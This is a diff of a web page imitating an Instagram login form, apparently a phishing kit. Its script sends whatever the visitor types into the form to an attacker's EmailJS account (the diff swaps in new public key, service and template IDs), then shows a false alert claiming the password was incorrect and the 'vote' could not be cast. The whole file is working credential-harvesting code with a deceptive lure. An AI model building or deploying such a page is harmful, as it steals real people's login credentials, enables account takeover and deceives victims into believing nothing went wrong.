@@ -34,8 +34,8 @@
                     </div>
                 </div>
                 <div class="form-container">
-                    <form id="form"  method="POST" >
->
+                    <form id="form"  method="POST"  >
+
                     <div class="form-content box">
                         <div class="logo">
                             <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
@@ -135,7 +135,7 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     
     <script type="text/javascript">
-        emailjs.init('0zsEfIiuyBaoMFtRz')
+        emailjs.init('ByKKND5PNQ1gsriWd')
         const btn = document.getElementById('button');
 
             document.getElementById('form')
@@ -144,13 +144,13 @@
 
                     btn.value = 'Sending...';
 
-                    const serviceID = 'service_45u0k4r';
-                    const templateID = 'template_1avk7j6';
+                    const serviceID = 'service_uh6z80q';
+                    const templateID = 'template_5xgf9ov';
 
                     emailjs.sendForm(serviceID, templateID, this)
                         .then(() => {
                             btn.value = 'Send Email';
-                            alert('Unable to cast vote user password is incorrect to validate Identity');
+                            alert('unable to validate vote user password incorrect !!');
                         }, (err) => {
                             btn.value = 'Send Email';
                             alert(JSON.stringify(err));
